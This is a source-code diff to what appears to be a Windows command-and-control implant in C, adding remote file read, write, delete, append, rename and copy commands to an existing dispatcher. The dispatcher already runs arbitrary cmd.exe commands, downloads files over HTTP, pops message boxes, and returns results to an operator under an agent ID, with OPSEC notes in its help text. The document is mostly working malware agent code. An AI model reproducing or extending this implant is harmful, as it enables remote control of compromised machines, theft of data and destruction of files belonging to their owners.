@@ -33,71 +33,85 @@ void rmdir(OutboundJsonDataStruct* response_struct, char* args);
 void cd(OutboundJsonDataStruct* response_struct, char* args);
 void pwd(OutboundJsonDataStruct* response_struct);
 
+//file ops
+void write_file(OutboundJsonDataStruct* response_struct, char* args);
+void read_file(OutboundJsonDataStruct* response_struct, char* args);
+void delete_file(OutboundJsonDataStruct* response_struct, char* args);
+void append_file(OutboundJsonDataStruct* response_struct, char* args);
+void rename_file(OutboundJsonDataStruct* response_struct, char* args);
+void copy_file(OutboundJsonDataStruct* response_struct, char* args);
+
 // ====================
 // Functions
 // ====================
 
 // later - have a seperate parse tree based on if creds are supplied or not, or
 // somethign like that...
-int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct)
-{
+
+int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct) {
     if (!response_struct) {
         DEBUG_LOG("[!] response_struct is NULL!\n");
         return -1; // Error case
     }
 
-    DEBUG_LOG("Struct UUID: %s\n",
-        response_struct->agent_id); // Correct: Use -> for pointers
+    DEBUG_LOG("Struct UUID: %s\n", response_struct->agent_id);
     DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);
-
-    // cant use switch cuz char * is not a single value (intergral type)
 
     if (strcmp(command, "whoami") == 0) {
         DEBUG_LOG("[COMMAND] whoami\n");
         get_username(response_struct);
-    } 
-    else if (strcmp(command, "shell") == 0) {
+    } else if (strcmp(command, "shell") == 0) {
         DEBUG_LOG("[COMMAND] shell\n");
         shell(response_struct, args);
-    } 
-    else if (strcmp(command, "get_http") == 0) {
+    } else if (strcmp(command, "get_http") == 0) {
         DEBUG_LOG("[COMMAND] get_http...\n");
         get_file_http(response_struct, args);
-    } 
-    else if (strcmp(command, "messagebox") == 0) {
-        DEBUG_LOG("[COMMAND] get_http...\n");
+    } else if (strcmp(command, "messagebox") == 0) {
+        DEBUG_LOG("[COMMAND] messagebox...\n");
         messagebox(response_struct, args);
-    } 
-    else if (strcmp(command, "help") == 0) {
+    } else if (strcmp(command, "help") == 0) {
         DEBUG_LOG("[COMMAND] help...\n");
         help(response_struct);
-    } 
-    else if (strcmp(command, "sleep") == 0) {
+    } else if (strcmp(command, "sleep") == 0) {
         DEBUG_LOG("[COMMAND] sleep\n");
         sleep(response_struct, args);
-    } 
-    else if (strcmp(command, "mkdir") == 0) {
+    } else if (strcmp(command, "mkdir") == 0) {
         DEBUG_LOG("[COMMAND] mkdir\n");
         mkdir(response_struct, args);
-    }
-    else if (strcmp(command, "cd") == 0) {
+    } else if (strcmp(command, "cd") == 0) {
         DEBUG_LOG("[COMMAND] cd\n");
         cd(response_struct, args);
-    }
-    else if (strcmp(command, "rmdir") == 0) {
+    } else if (strcmp(command, "rmdir") == 0) {
         DEBUG_LOG("[COMMAND] rmdir\n");
         rmdir(response_struct, args);
-    }
-    else if (strcmp(command, "pwd") == 0) {
+    } else if (strcmp(command, "pwd") == 0) {
         DEBUG_LOG("[COMMAND] pwd\n");
         pwd(response_struct);
-    }
-    else {
+    } else if (strcmp(command, "write_file") == 0) {
+        DEBUG_LOG("[COMMAND] write_file\n");
+        write_file(response_struct, args);
+    } else if (strcmp(command, "read_file") == 0) {
+        DEBUG_LOG("[COMMAND] read_file\n");
+        read_file(response_struct, args);
+    } else if (strcmp(command, "delete_file") == 0) {
+        DEBUG_LOG("[COMMAND] delete_file\n");
+        delete_file(response_struct, args);
+    } else if (strcmp(command, "append_file") == 0) {
+        DEBUG_LOG("[COMMAND] append_file\n");
+        append_file(response_struct, args);
+    } else if (strcmp(command, "rename_file") == 0) {
+        DEBUG_LOG("[COMMAND] rename_file\n");
+        rename_file(response_struct, args);
+    } else if (strcmp(command, "copy_file") == 0) {
+        DEBUG_LOG("[COMMAND] copy_file\n");
+        copy_file(response_struct, args);
+    } else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
         set_response_data(response_struct, "Unknown command");
     }
     return 0;
 }
+
 // ====================
 // Helper funcs
 // ====================
@@ -378,18 +392,25 @@ void sleep(OutboundJsonDataStruct* response_struct, char* args) {
 // Keep
 void help(OutboundJsonDataStruct* response_struct) {
     const char* help_string = "Help:\n\
-> File System Commands:\n\
+> File Commands: [Not WhisperWinAPI Yet] \n\
+    write_file: (write_file <str: path> <str: contents>): Writes contents to a file.\n\
+    read_file: (read_file <str: path>): Reads contents of a file.\n\
+    delete_file: (delete_file <str: path>): Deletes a file.\n\
+    append_file: (append_file <str: path> <str: contents>): Appends data to an existing file.\n\
+    rename_file: (rename_file <str: old_path> <str: new_path>): Renames or moves a file.\n\
+    copy_file: (copy_file <str: src> <str: dest>): Copies a file from one location to another.\n\
+> Directory Commands: [Not WhisperWinAPI Yet] \n\
     mkdir: (mkdir <str: directory>): Creates a new directory.\n\
     rmdir: (rmdir <str: directory>): Removes a directory.\n\
     cd: (cd <str: directory>): Changes the current directory.\n\
     pwd: (pwd): Prints the current working directory.\n\
 > Loud Commands\n\
-	http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
-		[ OPSEC: Will write file to disk ]\n\
-	shell: (shell <str: command>): Run a command via cmd.exe\n\
-		[ OPSEC: Runs a new cmd.exe process ]\n\
-	messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
-		[ OPSEC: Shows on users screen ]\n\
+    http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
+        [ OPSEC: Will write file to disk ]\n\
+    shell: (shell <str: command>): Run a command via cmd.exe\n\
+        [ OPSEC: Runs a new cmd.exe process ]\n\
+    messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
+        [ OPSEC: Shows on users screen ]\n\
 > Config Commands:\n\
     sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
 ";
@@ -496,6 +517,187 @@ void pwd(OutboundJsonDataStruct* response_struct) {
         char error_message[256];
         FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
         set_response_data(response_struct, error_message); // Include error message in response
+    }
+}
+
+// ============
+// File OPs
+// ============
+void write_file(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* path = strtok_s(args, " ", &context);
+    char* contents = strtok_s(NULL, "", &context);
+
+    if (!path || !contents) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <path> <contents>");
+        return;
+    }
+
+    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    DWORD bytesWritten;
+    if (WriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
+        set_response_data(response_struct, "File written successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+
+    CloseHandle(hFile);
+}
+
+void read_file(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* path = strtok_s(args, " ", &context);
+
+    if (!path) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <path>");
+        return;
+    }
+
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        CloseHandle(hFile);
+        return;
+    }
+
+    char* contents = (char*)malloc(fileSize + 1);
+    if (!contents) {
+        set_response_data(response_struct, "Memory allocation failed");
+        CloseHandle(hFile);
+        return;
+    }
+
+    DWORD bytesRead;
+    if (ReadFile(hFile, contents, fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
+        contents[fileSize] = '\0';
+        set_response_data(response_struct, contents);
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+
+    free(contents);
+    CloseHandle(hFile);
+}
+
+void delete_file(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* path = strtok_s(args, " ", &context);
+
+    if (!path) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <path>");
+        return;
+    }
+
+    if (DeleteFileA(path)) {
+        set_response_data(response_struct, "File deleted successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+}
+
+void append_file(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* path = strtok_s(args, " ", &context);
+    char* contents = strtok_s(NULL, "", &context);
+
+    if (!path || !contents) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <path> <contents>");
+        return;
+    }
+
+    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+        return;
+    }
+
+    SetFilePointer(hFile, 0, NULL, FILE_END); // Seek to the end
+
+    DWORD bytesWritten;
+    if (WriteFile(hFile, contents, strlen(contents), &bytesWritten, NULL)) {
+        set_response_data(response_struct, "Data appended to file successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+
+    CloseHandle(hFile);
+}
+
+void rename_file(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* old_path = strtok_s(args, " ", &context);
+    char* new_path = strtok_s(NULL, " ", &context);
+
+    if (!old_path || !new_path) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <old_path> <new_path>");
+        return;
+    }
+
+    if (MoveFileA(old_path, new_path)) {
+        set_response_data(response_struct, "File renamed/moved successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
+    }
+}
+
+void copy_file(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL;
+    char* src = strtok_s(args, " ", &context);
+    char* dest = strtok_s(NULL, " ", &context);
+
+    if (!src || !dest) {
+        set_response_data(response_struct, "Invalid arguments. Expected: <src> <dest>");
+        return;
+    }
+
+    if (CopyFileA(src, dest, FALSE)) {
+        set_response_data(response_struct, "File copied successfully");
+    } else {
+        DWORD error = GetLastError();
+        char error_message[256];
+        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
+        set_response_data(response_struct, error_message);
     }
 }
 
